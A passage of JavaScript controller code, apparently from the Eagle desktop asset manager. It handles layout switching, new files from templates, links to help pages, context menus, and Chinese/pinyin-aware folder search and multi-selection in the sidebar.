            $scope.saveLayout($scope.currentFolder || $scope.currentSmartFolder, "JustifiedLayout");
        }

        $scope.switchSquareLayout = function () {
            $scope.switchLayout("SquareLayout");
            $scope.$evalAsync();
            $scope.saveLayout($scope.currentFolder || $scope.currentSmartFolder, "SquareLayout");
        }

        $scope.switchListLayout = function () {
            $scope.switchLayout("ListLayout");
            $scope.$evalAsync();
            $scope.saveLayout($scope.currentFolder || $scope.currentSmartFolder, "ListLayout");
        }

        $scope.switchLibrary = function (event) {
            var shortcutMode = event.button === undefined;
            var openFixUtils = event && (event.altKey || event.metaKey || event.ctrlKey);
            if (openFixUtils && !shortcutMode) {
                FixUtils.openContextMenu();
            }
            else {
                $rootScope.$broadcast("OPEN_LIBRARY_PANEL");
            }
        };

		$scope.openPluginPanel = (event) => {
			// return;
			$rootScope.$broadcast("OPEN_PLUGIN_PANEL");
		}

        $scope.ContextMenuItems = {
            "grayscale": new MenuItem({
                label: i18n.__('appmenu.view>grayscale'),
                type: 'checkbox',
                checked: $scope.isGrayscaleMode,
                accelerator: 'CmdOrCtrl+Alt+G',
                click: function () {
                    $scope.isGrayscaleMode = !$scope.isGrayscaleMode;
                    if (process.platform == 'darwin') {
                        applicationMenu.items[6].submenu.items[15].checked = $scope.isGrayscaleMode;
                    }
                    else {
                        applicationMenu.items[5].submenu.items[15].checked = $scope.isGrayscaleMode;
                    }
                    $scope.$evalAsync();
                }
            }),
        };

        $scope.createTxtFileFromTemplate = function (event) {
        	event && event.preventDefault();
        	$scope.newFileFromTemplate("txt");
        	$scope.$evalAsync();
        }

        // 創建空白源文件
        $scope.newFileFromTemplate = function (ext) {

        	var templatePath = path.normalize(`${resourcesPath}/templates/Untitled.${ext}`);
            if (!fs.existsSync(templatePath)) return;

            let newFilePath = `${EAGLE_THUMBNAIL_TEMP_PATH}/Untitled.${ext}`;
            let filePath = newFilePath;
            try {
                fse.copy(templatePath, newFilePath, function (err) {
                    if (err) { filePath = templatePath; }

                    var file = {
                        name: i18n.__("general.untitled.title"),
                        path: filePath,
                        lastModified: Date.now()
                    };
                    if ($scope.currentFolder && $scope.currentFolder.id) {
                        file.folders = [$scope.currentFolder.id];
                        if ($scope.currentFolder.extendTags) {
                            file.tags = $scope.currentFolder.extendTags;
                            file.tags = [...new Set(file.tags)];
                        }
                    }
                    $scope.uploadFiles([file]);
                    $scope.showUploadQueue();
                    
                    ipcRenderer.send('electron-info', `[app] Create file from [Untitled.${ext}]`);
                });
            }
            catch (err) {
                electronLog && electronLog.error(err.stack || err);
            }
        };

        $scope.openShortcuts = function () {
            $rootScope.$broadcast("OPEN_SHORTCUTS");
        };

        $scope.openGetStarted = function () {
            switch (preferences.general.language) {
                case 'zh_CN':
                    electron.shell.openExternal('https://docs-cn.eagle.cool/article/167-tutorial-1-overview-of-library-and-interface')
                    break;
                case 'zh_TW':
                    electron.shell.openExternal('https://docs-tw.eagle.cool/article/288-tutorial-1-overview-of-library-and-interface')
                    break;
                case 'ja_JP':
                    electron.shell.openExternal('https://docs-jp.eagle.cool/article/1043-tutorial-1-overview-of-library-and-interface')
                    break;
                default:
                    electron.shell.openExternal('https://docs-en.eagle.cool/article/266-tutorial-1-overview-of-library-and-interface')
            }
        };

        $scope.openHelpCenter = function () {
            switch (preferences.general.language) {
                case 'zh_CN':
                    electron.shell.openExternal('https://docs-cn.eagle.cool')
                    break;
                case 'zh_TW':
                    electron.shell.openExternal('https://docs-tw.eagle.cool')
                    break;
                case 'ja_JP':
                    electron.shell.openExternal('https://docs-jp.eagle.cool')
                    break;
                default:
                    electron.shell.openExternal('https://docs-en.eagle.cool')
            }
        };

        $scope.openTipTricks = function () {
            switch (preferences.general.language) {
                case 'zh_CN':
                    electron.shell.openExternal('https://docs-cn.eagle.cool/category/52-category')
                    break;
                case 'zh_TW':
                    electron.shell.openExternal('https://docs-tw.eagle.cool/category/859-category')
                    break;
                case 'ja_JP':
                    electron.shell.openExternal('https://docs-jp.eagle.cool/category/1023-category')
                    break;
                default:
                    electron.shell.openExternal('https://docs-en.eagle.cool/category/153-category')
            }
        };

        $scope.openAPIDocument = function () {
            switch (preferences.general.language) {
                case 'zh_CN':
                    electron.shell.openExternal('https://www.yuque.com/augus-gsjgn/eagle-api')
                    break;
                default:
                    electron.shell.openExternal('https://api.eagle.cool/')
            }
        };

        $scope.openTwitter = function () {
            electron.shell.openExternal('https://twitter.com/eagle_app');
        };

        $scope.openPrivacy = function () {
            electron.shell.openExternal('https://eagle.cool/privacy');
        };

        

        $scope.openNewContextMenu = function() {
            ContextMenu.open({
                items: [
                    // 建立资料夹
                    {
                        accelerator: $rootScope.preferences.shortcuts.keybinds['create.folder'] || 'CmdOrCtrl+Shift+N',
                        label: i18n.__('context.import.createFolder'),
                        keywords: 'folder dir new create 資料夾 文件夾 新建 建立 新增 ',
                        icon: 'ic-folder-new-folder.svg',
                        click: function() { $scope.newFolder(); }
                    },
                    // 建立智能资料夹
                    {
                        accelerator: $rootScope.preferences.shortcuts.keybinds['create.smartFolder'] || 'CmdOrCtrl+Shift+Alt+N',
                        label: i18n.__('context.import.createSmartFolder'),
                        keywords: 'smart folder dir new create 資料夾 文件夾 新建 建立 新增 智能 智慧',
                        icon: 'ic-smart-folder-new.svg',
                        click: function() {
                            $scope.newSmartFolder();
                            $scope.$evalAsync();
                        }
                    },
                    {
                        role: 'separator'
                    },
                    // 導入本地文件夾
                    {
                        label: i18n.__('context.import.folders'),
                        keywords: 'import folder dir 資料夾 文件夾 導入 local 本地 本機 本机 匯入 导入',
                        icon: 'ic-import-local.svg',
                        click: function() {
                            $scope.importFolders();
                        }
                    },
                    // 導入 eaglepack
                    {
                        label: i18n.__('context.import.eaglepack'),
                        keywords: 'import eaglepack 素材包 導入 匯入',
                        icon: 'ic-import-eaglepack.svg',
                        click: function () {
                            dialog.showOpenDialog(currentWindow, {
                                title: i18n.__("Dialog.Import.Eaglepack.Message"),
                                filters: [
                                    { name: 'Eagle Pack', extensions: ['eaglepack'] },
                                ],
                                properties: ['openFile']
                            }).then(result => {
                                var paths = result.filePaths;
                                if (!paths || paths.length === 0) return;
                                var packPath = paths[0];
                                ipcRenderer.send("open-eaglepack", {
                                    path: packPath
                                });
                            });
                        }
                    },
                    {
                        label: i18n.__("appmenu.file>autoImport"),
                        icon: 'ic-import-autoimport.svg',
                        submenu: {
                            items: [
                                {
                                    label: i18n.__("appmenu.file>autoImport>settings"),
                                    keywords: `${i18n.__("appmenu.file>autoImport")} 自動導入 設定 設置 settings auto import`,
                                    click: function () {
                                        ipcRenderer.send('open.preferences', {
                                            panel: "autoImport"
                                        });
                                    }
                                },
                                {
                                    disabled: true,
                                    visible: $rootScope.preferences.autoImport.enable === 'true' && $rootScope.preferences.autoImport.path,
                                    label: $rootScope.preferences.autoImport.path,
                                    click: function () {
                                        ipcRenderer.send('open-with-default', $rootScope.preferences.autoImport.path);
                                    }
                                }
                            ]
                        }
                    },
                    // 找重複檔案
                    {
                        label: i18n.__("context.import.findDuplicate"),
                        icon: 'ic-find-duplicate.svg',
                        submenu: {
                            items: [
                                {
                                    label: i18n.__("context.import.findDuplicate>all"),
                                    keywords: 'duplicate 重複 搜索 尋找 repeat',
                                    click: function () {
                                        $scope.openDuplicate();
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    disabled: $scope.allData.length === 0,
                                    label: i18n.__("context.import.findDuplicate>currentList"),
                                    keywords: 'duplicate 重複 搜索 尋找 repeat',
                                    click: function () {
                                        $scope.openDuplicate({
                                            currentPage: true
                                        });
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    disabled: $scope.selected.length <= 1,
                                    label: i18n.__("context.import.findDuplicate>selected"),
                                    keywords: 'duplicate 重複 搜索 尋找 repeat',
                                    click: function () {
                                        $scope.openDuplicate({
                                            selected: true
                                        });
                                        $scope.$evalAsync();
                                    }
                                }
                            ]
                        }
                    },
                    {
                        role: 'separator'
                    },
                    // 設計文件
                    {
                        visible: process.platform == 'darwin' && installedApplications["sketch"].isInstalled,
                        label: "Sketch " + i18n.__("general.document"),
                        keywords: 'template 模板 file',
                        icon: '/templates/ic-sketch.png',
                        click: function() { $scope.newFileFromTemplate("sketch"); $scope.$evalAsync(); }
                    },
                    {
                        label: "Photoshop " + i18n.__("general.document"),
                        icon: '/templates/ic-photoshop.png',
                        keywords: 'template 模板 file adobe psd photoshop',
                        click: function() { $scope.newFileFromTemplate("psd"); $scope.$evalAsync(); }
                    },
                    {
                        label: "Illustrator " + i18n.__("general.document"),
                        icon: '/templates/ic-illustration.png',
                        keywords: 'template 模板 file adobe ai illustrator',
                        click: function() { $scope.newFileFromTemplate("ai"); $scope.$evalAsync(); }
                    },
                    {
                        label: "XD " + i18n.__("general.document"),
                        icon: '/templates/ic-xd.png',
                        keywords: 'template 模板 file adobe xd',
                        click: function() { $scope.newFileFromTemplate("xd"); $scope.$evalAsync(); }
                    },
                    {
                        role: 'separator'
                    },
                    // 其它文件
                    {
                        accelerator: 'Alt+Shift+N',
                        label: i18n.__("general.txtDocument"),
                        icon: '/templates/ic-txt.png',
                        keywords: 'template 模板 file note txt text',
                        click: function() { $scope.newFileFromTemplate("txt"); $scope.$evalAsync(); }
                    },
                    {
                        label: "Word " + i18n.__("general.document"),
                        icon: '/templates/ic-word.png',
                        keywords: 'template 模板 file office microsoft doc docx word',
                        click: function() { $scope.newFileFromTemplate("docx"); $scope.$evalAsync(); }
                    },
                    {
                        label: "PowerPoint " + i18n.__("general.document"),
                        icon: '/templates/ic-powerpoint.png',
                        keywords: 'template 模板 file office microsoft ppt pptx powerpoint',
                        click: function() { $scope.newFileFromTemplate("pptx"); $scope.$evalAsync(); }
                    },
                    {
                        label: "Excel " + i18n.__("general.document"),
                        icon: '/templates/ic-excel.png',
                        keywords: 'template 模板 file office microsoft xls xlsx csv excel',
                        click: function() { $scope.newFileFromTemplate("xlsx"); $scope.$evalAsync(); }
                    },
                    {
                        visible: process.platform == 'darwin',
                        label: "Keynote " + i18n.__("general.document"),
                        icon: '/templates/ic-keynote.png',
                        keywords: 'template 模板 file apple office',
                        click: function() { $scope.newFileFromTemplate("key"); $scope.$evalAsync(); }
                    },
                    {
                        visible: process.platform == 'darwin',
                        label: "Pages " + i18n.__("general.document"),
                        icon: '/templates/ic-pages.png',
                        keywords: 'template 模板 file apple office',
                        click: function() { $scope.newFileFromTemplate("pages"); $scope.$evalAsync(); }
                    },
                    {
                        visible: process.platform == 'darwin',
                        label: "Numbers " + i18n.__("general.document"),
                        icon: '/templates/ic-numbers.png',
                        keywords: 'template 模板 file apple office',
                        click: function() { $scope.newFileFromTemplate("numbers"); $scope.$evalAsync(); }
                    },
                    {
                        visible: process.platform == 'darwin' && installedApplications["mindnode"].isInstalled,
                        label: "MindNode " + i18n.__("general.document"),
                        icon: '/templates/ic-mindnode.png',
                        keywords: 'template 模板 file mind 脑图 心智图',
                        click: function() { $scope.newFileFromTemplate("mindnode"); $scope.$evalAsync(); }
                    },
                    {
                        visible: (process.platform == 'darwin')? installedApplications["xmind"].isInstalled : true,
                        label: "XMind " + i18n.__("general.document"),
                        icon: '/templates/ic-xmind.png',
                        keywords: 'template 模板 file mind 脑图 心智图',
                        click: function() { $scope.newFileFromTemplate("xmind"); $scope.$evalAsync(); }
                    },
                    {
                        role: 'separator'
                    },
                    {
                        label: "Pinterest",
                        icon: '/templates/ic-pinterest.png',
                        click: function() { $scope.openPinterest(); }
                    },
                    {
                        label: i18n.__('context.import.others>artstation'),
                        icon: '/templates/ic-artstation.png',
                        accelerator: preferences.shortcuts.keybinds['import.artstation'] || 'Ctrl+Alt+Shift+S',
                        click: function() { $scope.openArtstation(); }
                    },
                    {
                        visible: preferences?.general?.language === "zh_CN",
                        label: i18n.__('context.import.others>huaban'),
                        keywords: 'huaban 花瓣',
                        icon: '/templates/ic-huaban.png',
                        click: function() { $scope.openHuaban(); }
                    }
                ],
                showSearch: true,
            })
        };

        $scope.openColorContextMenu = (palette) => {
            let color = palette.color;
            let r  = color[0];
            let g = color[1];
            let b = color[2];
            let hsl = colorConvert.rgb.hsl(r,g,b);
            let hsv = colorConvert.rgb.hsv(r,g,b);
            let hwb = colorConvert.rgb.hwb(r,g,b);
            let cmyk = colorConvert.rgb.cmyk(r,g,b);

            let hexStr = $scope.rgbToHex(color[0], color[1], color[2]).toLowerCase();
            let rgbStr = `rgb(${color[0]}, ${color[1]}, ${color[2]})`;
            let rgbaStr = `rgba(${color[0]}, ${color[1]}, ${color[2]}, 1)`;
            let hslStr = `hsl(${hsl[0]}, ${hsl[1]}%, ${hsl[2]}%)`;  // hsl(313, 88%, 76%)
            let hsvStr = `hsv(${hsv[0]}, ${hsv[1]}%, ${hsv[2]}%)`;  // hsv(50, 100, 100)
            let hwbStr = `hwb(${hwb[0]}, ${hwb[1]}%, ${hwb[2]}%)`;  // hwb(0, 0%, 0%)
            let cmykStr = `cmyk(${cmyk[0]}%, ${cmyk[1]}%, ${cmyk[2]}%, ${cmyk[3]}%)`;   // cmyk(100%, 0%, 0%, 0%)

            ContextMenu.open({
                items: [
                    {
                        label: i18n.__('context.color.filter'),
                        click: () => {
                            $scope.hexColor = $scope.rgbToHex(color[0], color[1], color[2]);
                            $scope.filterWithColor(color);
                            $scope.$evalAsync();
                        }
                    },
                    {
                        role: "separator"
                    },
                    {
                        label: i18n.__('context.color.copy') + hexStr,
                        keywords: "hex 十六进制",
                        click: () => {
                            clipboard.writeText(hexStr);
                            $scope.notify({
                                message: i18n.__('notify.colorCopySuccess'),
                                duration: 750
                            });
                        }
                    },
                    {
                        label: i18n.__('context.color.copy') + rgbStr,
                        click: () => {
                            clipboard.writeText(rgbStr);
                            $scope.notify({
                                message: i18n.__('notify.colorCopySuccess'),
                                duration: 750
                            });
                        }
                    },
                    {
                        label: i18n.__('context.color.copy') + rgbaStr,
                        click: () => {
                            clipboard.writeText(rgbaStr);
                            $scope.notify({
                                message: i18n.__('notify.colorCopySuccess'),
                                duration: 750
                            });
                        }
                    },
                    {
                        label: i18n.__('context.color.copy') + hslStr,
                        click: () => {
                            clipboard.writeText(hslStr);
                            $scope.notify({
                                message: i18n.__('notify.colorCopySuccess'),
                                duration: 750
                            });
                        }
                    },
                    {
                        role: "separator"
                    },
                    {
                        label: i18n.__('context.color.copy') + hsvStr,
                        click: () => {
                            clipboard.writeText(hsvStr);
                            $scope.notify({
                                message: i18n.__('notify.colorCopySuccess'),
                                duration: 750
                            });
                        }
                    },
                    {
                        label: i18n.__('context.color.copy') + hwbStr,
                        click: () => {
                            clipboard.writeText(hwbStr);
                            $scope.notify({
                                message: i18n.__('notify.colorCopySuccess'),
                                duration: 750
                            });
                        }
                    },
                    {
                        label: i18n.__('context.color.copy') + cmykStr,
                        click: () => {
                            clipboard.writeText(cmykStr);
                            $scope.notify({
                                message: i18n.__('notify.colorCopySuccess'),
                                duration: 750
                            });
                        }
                    },
                    {
                        role: "separator"
                    },
                    {
                        label: i18n.__('context.color.main'),
                        type: "checkbox",
                        checked: !!palette.marked,
                        click: () => {
                            palette.marked = !palette.marked;
                            $scope.$evalAsync();
                            if ($scope.selected[0]) {
                                ayncsImagesChange([$scope.selected[0]]);
                            }
                        }
                    }
                ],
                showSearch: true,
            });
            
        };

        $scope.openRecentContextMenu = function (event) {
            const $target = $(".sidebar-item-container .item").has(event.target);
            ContextMenu.open({
                items: [
                    {
                        label: i18n.__('context.recent.clear'),
                        icon: 'ic-trash-empty.svg',
                        click: () => {
                            RecentFileManager.clean();
                            if ($scope.viewMode === 'recent') {
                                $scope.reload();
                            }
                        }
                    },
                ],
                showSearch: false,
                onOpened: () => {
                    $target.addClass("context-activate");
                },
                onClosed: () => {
                    $target.removeClass("context-activate");
                }
            });
        };

        $scope.openSidebarVisibleContextMenu = function () {
            const $target = $(".sidebar-item-container .item").has(event.target);
            ContextMenu.open({
                items: [
                    {
                        checked: true, 
                        disabled: true,
                        label: i18n.__('preferencesWindow.sidebar.all'),
                        icon: 'ic-sidebar-all.svg',
                        keepOpen: true,
                        click: () => {}
                    },
                    {
                        checked: $rootScope.preferences.sidebar.unfiled === 'true', 
                        label: i18n.__('preferencesWindow.sidebar.unfiled'),
                        icon: 'ic-sidebar-unfiled.svg',
                        keepOpen: true,
                        click: () => {
                            if ($rootScope.preferences.sidebar.unfiled === "true") $rootScope.preferences.sidebar.unfiled = 'false';
                            else $rootScope.preferences.sidebar.unfiled = "true";
                            ipcRenderer.send('chnage-preferences', $rootScope.preferences);
                        }
                    },
                    {
                        checked: $rootScope.preferences.sidebar.untagged === 'true', 
                        label: i18n.__('preferencesWindow.sidebar.untagged'),
                        icon: 'ic-sidebar-untagged.svg',
                        keepOpen: true,
                        click: () => {
                            if ($rootScope.preferences.sidebar.untagged === "true") $rootScope.preferences.sidebar.untagged = 'false';
                            else $rootScope.preferences.sidebar.untagged = "true";
                            ipcRenderer.send('chnage-preferences', $rootScope.preferences);
                        }
                    },
                    {
                        checked: $rootScope.preferences.sidebar.recent === 'true', 
                        label: i18n.__('general.pages.recent'),
                        icon: 'ic-sidebar-recent.svg',
                        keepOpen: true,
                        click: () => {
                            if ($rootScope.preferences.sidebar.recent === "true") $rootScope.preferences.sidebar.recent = 'false';
                            else $rootScope.preferences.sidebar.recent = "true";
                            ipcRenderer.send('chnage-preferences', $rootScope.preferences);
                        }
                    },
                    {
                        checked: $rootScope.preferences.sidebar.random === 'true', 
                        label: i18n.__('preferencesWindow.sidebar.random'),
                        icon: 'ic-sidebar-random.svg',
                        keepOpen: true,
                        click: () => {
                            if ($rootScope.preferences.sidebar.random === "true") $rootScope.preferences.sidebar.random = 'false';
                            else $rootScope.preferences.sidebar.random = "true";
                            ipcRenderer.send('chnage-preferences', $rootScope.preferences);
                        }
                    },
                    {
                        checked: $rootScope.preferences.sidebar.community2 === 'true', 
                        label: i18n.__('preferencesWindow.sidebar.community'),
                        icon: 'ic-sidebar-community.svg',
                        keepOpen: true,
                        click: () => {
                            if ($rootScope.preferences.sidebar.community2 === "true") $rootScope.preferences.sidebar.community2 = 'false';
                            else $rootScope.preferences.sidebar.community2 = "true";
                            ipcRenderer.send('chnage-preferences', $rootScope.preferences);
                        }
                    },
                    {
                        checked: true, 
                        disabled: true, 
                        label: i18n.__('preferencesWindow.sidebar.allTags'),
                        icon: 'ic-sidebar-tag-manager.svg',
                        keepOpen: true,
                        click: () => {}
                    }
                ],
                showSearch: false,
                onOpened: () => {
                    $target.addClass("context-activate");
                },
                onClosed: () => {
                    $target.removeClass("context-activate");
                }
            });
        };

        $scope.openTrashContextMenu = function(event) {

            const disabled = $scope.trash.length === 0;
            const $trash = $(event.delegateTarget);

            ContextMenu.open({
                items: [
                    {
                        disabled: disabled,
                        label: i18n.__('context.emptyTrash.empty'),
                        keywords: `empty delete remove trash`,
                        icon: 'ic-trash-empty.svg',
                        click: () => { $scope.$evalAsync(() => { $scope.emptyTrash(); }); }
                    },
                    {
                        disabled: disabled,
                        label: $filter('i18n')('context.emptyTrash.restoreAll'),
                        keywords: `restore`,
                        icon: 'ic-trash-restore.svg',
                        click: () => { $scope.$evalAsync(() => { $scope.emptyRestore(); }); }
                    }
                ],
                showSearch: false,
                onOpened: () => {
                    $trash.addClass("context-activate");
                },
                onClosed: () => {
                    $trash.removeClass("context-activate");
                }
            });
        };

        $scope.keywordSuggestSearchFilter = function(suggestion) {
            var result = fuzzy_match(suggestion.word, $scope.keyword).length > 0;
            if (result) {
                return true;
            }
            return false;
        };

        function filterSidebarItem (folders, keyword) {

            if (!keyword) return folders;
            var keyword_cn = chineseConvert.tw2cn(keyword);

            var folderSearchItems = folders.map(folder => {
                var folderNameCN = chineseConvert.tw2cn(folder.name);
                if (keyword.length >= 30 || folder.name.length >= 30) {
                    return {
                        folder: folder,
                        name: folderNameCN,
                        search: [folderNameCN]
                    }
                }
                return {
                    folder: folder,
                    name: folderNameCN,
                    search: [folderNameCN, ..._.uniq(
                        cartesianProduct(pinyinlite(folderNameCN, { keepUnrecognized : true }).filter(p => p.length > 0))
                        .map(item => item.join(' '))
                    )],
                };
            });

            var scores = folderSearchItems.map(item => {
                return {
                    item: item,
                    name: item.name,
                    score: _.max(item.search.map(pinyin => pinyin.score(keyword_cn))),
                };
            })
            
            var result = scores.filter(i => i.score > 0).map(function (i) {
                return i.item.folder;
            });

            return result;
        }

        $scope.folderSearchFilter = function(folder) {

            var result = false;
            var pinyinMatch = false;
            if (!$scope.folderKeyword) {
                return true;
            }
            if (folder && folder.name && $scope.folderKeyword) {
                result = fuzzy_match(folder.name, $scope.folderKeyword).length > 0;
                if (result) {
                    return true;
                }
                var keyword_cn = chineseConvert.tw2cn($scope.folderKeyword);
                var keyword_tw = chineseConvert.cn2tw($scope.folderKeyword);
                if (keyword_cn !== keyword_tw) {
                    var nameCNMatch = fuzzy_match(folder.name, keyword_cn).length > 0;
                    if (nameCNMatch) return true;

                    var nameTWMatch = fuzzy_match(folder.name, keyword_tw).length > 0;
                    if (nameTWMatch) return true;
                }

                if (folder.pinyin && $scope.folderKeyword.length > 3) {
                    pinyinMatch = fuzzy_match(folder.pinyin, $scope.folderKeyword).length > 0;
                }
                if (pinyinMatch) {
                    return true;
                }
                if (folder.children) {
                    var isMatch = false;
                    eagle.utils.tree.walk(folder.children, 'children', function(folder, parent) {
                        if (fuzzy_match(folder.name, $scope.folderKeyword).length > 0) {
                            isMatch = true;
                            return;
                        }
                        if (folder.pinyin && $scope.folderKeyword.length > 3) {
                            if (fuzzy_match(folder.pinyin, $scope.folderKeyword).length > 0) {
                                isMatch = true;
                                return;
                            }
                        }
                    });
                    return isMatch;
                }
            }
            return false;
        };

        $scope.expandFolder = function(folder) {
            if (!folder) return;
            folder.isExpand = true;
            $scope.updateSidebarList();
            localStorage.setItem("eagle.sidebar.folder.expand." + folder.id, true);
        };

        $scope.expandSmartFolder = function(smartFolder) {
            if (!smartFolder) return;
            smartFolder.isExpand = true;
            $scope.updateSidebarList();
            localStorage.setItem("eagle.sidebar.smartFolder.expand." + smartFolder.id, true);
        };

        $scope.preventMiddleClick = function(event) {
            if( event.which == 2 ) {
                event.stopPropagation();
            }
        };

        $scope.startDrag = function (event) {
            if ($scope.current) {
                var transformsJSON = JSON.stringify([$scope.current]);
                ipcRenderer.send('ondragstart', { images: transformsJSON, target: $scope.current, resize: 120 });
            }
        };

        $scope.clickNode = function(event, folder) {
            if (event.which == 2 || dragCheck) {
                event.stopPropagation();
                return;
            }
            if (event.metaKey || event.ctrlKey) {
                if ($scope.currentFolder) {
                    if ($rootScope.selectedFolders.indexOf($scope.currentFolder) === -1) {
                        $rootScope.selectedFolders.push($scope.currentFolder);
                    }
                    $rootScope.selectedFoldersMappings[$scope.currentFolder.id] = $scope.currentFolder;
                }
                $scope.multipleOpenFolder(folder, true);
            }
            else if (event.shiftKey) {

                if (!$scope.currentId) return;

                var id = $scope.currentId;
                var curarentFolderId = id.replace("folder-", "");
                var currentFolder = $scope.folderMappings[curarentFolderId];
                var fidx = $scope.sidebarList.indexOf(currentFolder);
                var tidx = $scope.sidebarList.indexOf(folder);

                if (fidx === -1 || tidx === -1) return;
                if (fidx > tidx) {
                    [fidx, tidx] = [tidx, fidx];
                }

                for (var i = fidx; i <= tidx; i++) {
                    var item = $scope.sidebarList[i];
                    if (item.vstype === "folder") {
                        var idx = $rootScope.selectedFolders.indexOf(item);
                        if (idx === -1) {
                            $rootScope.selectedFolders.push(item);
                            $rootScope.selectedFoldersMappings[item.id] = item;
                        }
                    }
                }
                $scope.reload();
            }
            else {
                $scope.openFolder(folder, false, 'folder-' + folder.id);
            }
        };

        $scope.multipleOpenFolder = function (folder, needReload) {
            $scope.resetFilter();
            $scope.keyword = "";
            $rootScope.currentFocus = "sidebar";
            $scope.viewMode = undefined;
            $scope.currentTag = undefined;
            $scope.startCursor = 0;
            $scope.currentSmartFolder = undefined;
            $rootScope.selectedSmartFolders = [];
            $rootScope.selectedSmartFoldersMappings = {};
            var idx = $rootScope.selectedFolders.indexOf(folder);
            if (idx === -1) {
                $rootScope.selectedFolders.push(folder);
                $rootScope.selectedFoldersMappings[folder.id] = folder;
                if (needReload) {
                    $scope.startCursor = 0;
                    $scope.reload();
                }
                $scope.currentId = 'folder-' + folder.id;
            }
            else {
                if ($rootScope.selectedFolders.length > 1) {
                    $rootScope.selectedFolders.splice(idx, 1);
                    delete $rootScope.selectedFoldersMappings[folder.id];
                    if (needReload) {
                        $scope.startCursor = 0;
                        $scope.reload();
                    }
                }
                else {
                    return;
                }
            }
            $scope.currentFolderChildren = getChildFoldersMaps($rootScope.selectedFolders);
        };


        $scope.clickSmartNode = function (event, smartFolder) {
            if (event.which == 2 || dragCheck) {
                event.stopPropagation();
                return;
            }
            if (event.metaKey || event.ctrlKey) {
                if ($scope.currentSmartFolder) {
                    if ($rootScope.selectedSmartFolders.indexOf($scope.currentSmartFolder) === -1) {
                        $rootScope.selectedSmartFolders.push($scope.currentSmartFolder);
                    }
                    $rootScope.selectedSmartFoldersMappings[$scope.currentSmartFolder.id] = $scope.currentSmartFolder;
                }
                $scope.multipleOpenSmartFolder(smartFolder, true);
            }
            else if (event.shiftKey) {

                if (!$scope.currentId) return;

                var id = $scope.currentId;
                var curarentSmartFolderId = id.replace("smart-folder-", "");
                var currentSmartFolder = $scope.smartFolderMappings[curarentSmartFolderId];
                var fidx = $scope.sidebarList.indexOf(currentSmartFolder);
                var tidx = $scope.sidebarList.indexOf(smartFolder);

                if (fidx === -1 || tidx === -1) return;
                if (fidx > tidx) {
                    [fidx, tidx] = [tidx, fidx];
                }

                for (var i = fidx; i <= tidx; i++) {
                    var item = $scope.sidebarList[i];
                    var idx = $rootScope.selectedSmartFolders.indexOf(item);
                    if (idx === -1) {
                        $rootScope.selectedSmartFolders.push(item);
                        $rootScope.selectedSmartFoldersMappings[item.id] = item;
                    }
                }
                $scope.reload();
            }
            else {
                $scope.openSmartFolder(smartFolder, false, 'smart-folder-' + smartFolder.id);
            }
        };

        $scope.multipleOpenSmartFolder = function (smartFolder, needReload) {
            $scope.resetFilter();
            $scope.keyword = "";
            $rootScope.currentFocus = "sidebar";
            $scope.viewMode = undefined;
            $scope.currentTag = undefined;
            $scope.startCursor = 0;
            $scope.currentFolder = undefined;
            $rootScope.selectedFolders = [];
            $rootScope.selectedFoldersMappings = {};
            var idx = $rootScope.selectedSmartFolders.indexOf(smartFolder);
            if (idx === -1) {
                $rootScope.selectedSmartFolders.push(smartFolder);
                $rootScope.selectedSmartFoldersMappings[smartFolder.id] = smartFolder;
                if (needReload) {
                    $scope.startCursor = 0;
                    $scope.reload();
                }
                $scope.currentId = 'smart-folder-' + smartFolder.id;
            }
            else {
                if ($rootScope.selectedSmartFolders.length > 1) {
                    $rootScope.selectedSmartFolders.splice(idx, 1);
                    delete $rootScope.selectedSmartFoldersMappings[smartFolder.id];
                    if (needReload) {
                        $scope.startCursor = 0;
                        $scope.reload();
                    }
                }
                else {
                    return;
                }
            }
        };

        $scope.getNodeClass = function (node) {
            var result = {
                'active active-item': ($rootScope.selectedFolders.length === 0 && $scope.currentId == 'folder-' + node.id) || $rootScope.selectedFoldersMappings[node.id],
                'locked': node.password && !node.isUnLock,
                'collapsed': !node.isExpand && !$scope.folderKeyword.length,
                'editable': node.editable,
                'selected': node.isSelected,
                'editable': node.editable,
                'empty-node': node.children && node.children.length == 0,
                'show-badge': node.imageCount > 0,
                'close': node.children && node.children.length <= 0 && node.isExpand,
                'show-lock-icon': node.password && !node.isUnLock,
                'show-unlock-icon': node.password && node.isUnLock,
                'has-childred': node.children && node.children.length > 0,
                'first': node.styles && node.styles.first,
                'last': node.styles && node.styles.last,
            }
            result[`depth-${node.styles.depth}`] = true;
            result[`icon-${node.icon}`] = true;
            result[`color-${node.iconColor}`] = true;
			let parent = $scope.folderMappings[node.parent];
			if (parent) {
				result[`parent-color-${parent?.iconColor}`] = true;
			}
            return result;
        };

        $scope.getQuickAccessClass = function (item) {
            var node;
            if (item.type === 'folder') {
                node = $scope.folderMappings[item.id];
            }
            else {
                node = $scope.smartFolderMappings[item.id];
            }
            
            if (!node) return;

            var result = {
                'active active-item': $scope.currentId === ('quickaccess-' + node.id),
                'locked': node.password && !node.isUnLock,
                'collapsed': !node.isExpand && !$scope.folderKeyword.length,
                'selected': node.isSelected,
                'editable': node.editable,
                'empty-node': node.children && node.children.length == 0,
                'color-red': node.iconColor == 'red',
                'color-orange': node.iconColor == 'orange',
                'color-yellow': node.iconColor == 'yellow',
                'color-green': node.iconColor == 'green',
                'color-aqua': node.iconColor == 'aqua',
                'color-blue': node.iconColor == 'blue',
                'color-purple': node.iconColor == 'purple',
                'color-pink': node.iconColor == 'pink',
                'show-badge': node.imageCount > 0,
                'close': node.children && node.children.length <= 0 && node.isExpand,
                'show-lock-icon': node.password && !node.isUnLock,
                'show-unlock-icon': node.password && node.isUnLock,
                'has-childred': node.children && node.children.length > 0,
            }
            result['icon-' + node.icon] = true;
            return result;
        };

        $scope.getSmartFolderClass = function (smartFolder) {
            
            var result = {
                'editable': smartFolder.editable,
                'selected': smartFolder.isSelected,
                'collapsed': !smartFolder.isExpand && !$scope.folderKeyword.length,
                'active active-item': ($rootScope.selectedSmartFolders.length === 0 && $scope.currentId == 'smart-folder-' + smartFolder.id) || $rootScope.selectedSmartFoldersMappings[smartFolder.id],
                'color-red': smartFolder.iconColor == 'red',
                'color-orange': smartFolder.iconColor == 'orange',
                'color-yellow': smartFolder.iconColor == 'yellow',
                'color-green': smartFolder.iconColor == 'green',
                'color-aqua': smartFolder.iconColor == 'aqua',
                'color-blue': smartFolder.iconColor == 'blue',
                'color-purple': smartFolder.iconColor == 'purple',
                'color-pink': smartFolder.iconColor == 'pink',
